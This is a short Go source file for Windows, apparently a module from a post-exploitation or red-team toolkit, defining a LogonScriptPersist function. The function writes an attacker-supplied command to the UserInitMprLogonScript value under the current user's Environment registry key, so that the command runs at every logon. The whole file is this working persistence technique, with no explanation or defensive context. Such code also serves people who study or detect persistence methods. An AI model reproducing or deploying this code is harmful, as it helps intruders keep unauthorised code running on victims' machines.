//go:build windows
// +build windows

package logonscript

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows/registry"
)

func LogonScriptPersist(args []string) (string, error) {
	if len(args) < 1 {
		return "", errors.New("Not Enough Args")
	}
	value := args[0]
	key, err := registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.ALL_ACCESS)
	if err != nil {
		return "", err
	}
	defer key.Close()
	err = key.SetStringValue("UserInitMprLogonScript", value)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Set Run Key Values %s : %s", "UserInitMprLogonScript", value), nil
}
